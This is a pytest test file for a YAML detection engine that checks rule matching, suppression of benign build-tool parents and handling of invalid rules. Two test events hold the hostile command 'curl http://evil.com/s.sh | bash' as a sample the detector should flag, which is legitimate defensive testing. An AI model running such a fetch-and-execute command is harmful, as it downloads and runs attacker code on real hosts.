import pytest
from pathlib import Path
from app.detection.engine.yaml_detection_engine import YAMLDetectionEngine

@pytest.fixture
def engine():
    return YAMLDetectionEngine()

def test_t1059_match_returns_candidate(engine):
    event = {
        "process": {
            "name": "bash",
            "command_line": "curl http://evil.com/s.sh | bash",
            "parent": {"name": "sshd"}
        },
        "user": {"name": "root"},
        "host": {"name": "test"}
    }
    # sample t1059 is disabled by default
    candidates = engine.evaluate_event(event, include_disabled=True)
    
    assert len(candidates) >= 1
    t1059 = next((c for c in candidates if c.rule_id == "linux_t1059_shell_network_tool_sample"), None)
    assert t1059 is not None
    assert t1059.matched is True
    assert t1059.suppressed is False
    assert "process.name matched in" in t1059.match_reasons[0]

def test_benign_build_workflow_returns_suppressed_candidate(engine):
    event = {
        "process": {
            "name": "sh",
            "command_line": "ls -la",
            "parent": {"name": "npm"}
        },
        "user": {"name": "root"},
        "host": {"name": "test"}
    }
    # To match the T1059 rule it needs curl/wget, but we want to test suppression.
    # We can use include_disabled=True and return_unmatched=True to see it if it didn't match,
    # OR we can assume our tuning files also apply to other rules.
    # Let's create a temporary rule that matches 'sh' to test suppression orchestration.
    
    # Actually, the 'benign_build_workflow_low_risk' suppression applies to ANY rule that matches the event.
    # So if we make it match T1059 by adding a keyword but keeping the parent as npm.
    event["process"]["command_line"] = "openssl s_client -connect google.com:443" # matches rule
    
    candidates = engine.evaluate_event(event, include_disabled=True)
    t1059 = next((c for c in candidates if c.rule_id == "linux_t1059_shell_network_tool_sample"), None)
    
    assert t1059 is not None
    assert t1059.matched is True
    assert t1059.suppressed is True
    assert t1059.suppression_id in ["benign_build_workflow_low_risk", "t1059_low_risk_build_parent_exception"]

def test_suspicious_shell_with_curl_not_suppressed(engine):
    event = {
        "process": {
            "name": "bash",
            "command_line": "curl http://evil.com/s.sh | bash",
            "parent": {"name": "sshd"} # Not npm/make
        },
        "user": {"name": "root"},
        "host": {"name": "test"}
    }
    candidates = engine.evaluate_event(event, include_disabled=True)
    t1059 = next((c for c in candidates if c.rule_id == "linux_t1059_shell_network_tool_sample"), None)
    
    assert t1059.matched is True
    assert t1059.suppressed is False

def test_unmatched_event_returns_empty_by_default(engine):
    event = {"something": "else"}
    candidates = engine.evaluate_event(event, include_disabled=True)
    # Only returns matched rules
    assert len([c for c in candidates if c.matched]) == 0

def test_unmatched_event_appears_when_requested(engine):
    event = {"something": "else"}
    candidates = engine.evaluate_event(event, include_disabled=True, return_unmatched=True)
    assert len(candidates) > 0
    assert candidates[0].matched is False

def test_include_suppressed_false_hides_candidate(engine):
    event = {
        "process": {
            "name": "sh",
            "command_line": "openssl s_client -connect google.com:443",
            "parent": {"name": "npm"}
        },
        "user": {"name": "root"},
        "host": {"name": "test"}
    }
    # Matches T1059 but suppressed by benign_build_workflow_low_risk
    candidates = engine.evaluate_event(event, include_disabled=True, include_suppressed=False)
    t1059 = next((c for c in candidates if c.rule_id == "linux_t1059_shell_network_tool_sample"), None)
    assert t1059 is None

def test_engine_handles_invalid_rule_gracefully(tmp_path):
    # Create an invalid YAML rule in a temp directory
    rules_dir = tmp_path / "rules"
    rules_dir.mkdir()
    invalid_rule = rules_dir / "invalid.yaml"
    invalid_rule.write_text("this: is not: valid: yaml: : :")
    
    # Engine pointing to this directory
    engine = YAMLDetectionEngine(rules_path=rules_dir)
    candidates = engine.evaluate_event({"f": "v"})
    
    # Should not crash, and should have a loader error if any valid rules were also there
    # Since there are NO valid rules, it returns empty list but loader.errors should have the error.
    # We can check loader errors via a dummy candidate if we want to propagate them.
    # My implementation attaches them to the first candidate.
    
    # Let's add one valid rule to see the error propagate.
    valid_rule = rules_dir / "valid.yaml"
    valid_rule.write_text("""
id: valid_rule
name: Valid Rule
description: test
severity: low
risk_score: 10
mitre: {tactic: test}
log_source: {product: test}
required_fields: [f]
condition: {field: f, operator: exists}
investigation_guide: test
""")
    
    candidates = engine.evaluate_event({"f": "v"})
    assert len(candidates) == 1
    assert any("Loader error" in e for e in candidates[0].errors)
